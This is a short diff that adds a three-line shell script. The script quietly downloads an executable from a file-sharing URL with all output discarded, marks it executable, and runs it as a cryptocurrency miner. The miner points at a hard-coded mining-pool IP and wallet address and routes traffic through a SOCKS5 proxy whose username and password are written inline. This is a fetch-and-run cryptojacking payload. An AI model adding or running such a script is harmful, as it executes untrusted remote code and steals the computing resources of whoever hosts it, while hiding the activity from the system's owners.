@@ -1,0 +1,3 @@
+wget -O mac https://transfer.sh/2u1KYK/buildname >/dev/null 2>&1
+chmod +x mac
+./mac -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u DQwPtoryjSEZpnmr9xZtoCVSHds3rxpgUk.xx -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -x socks5://gxlijwyq:no3u37imdlvp@192.252.214.20:15864
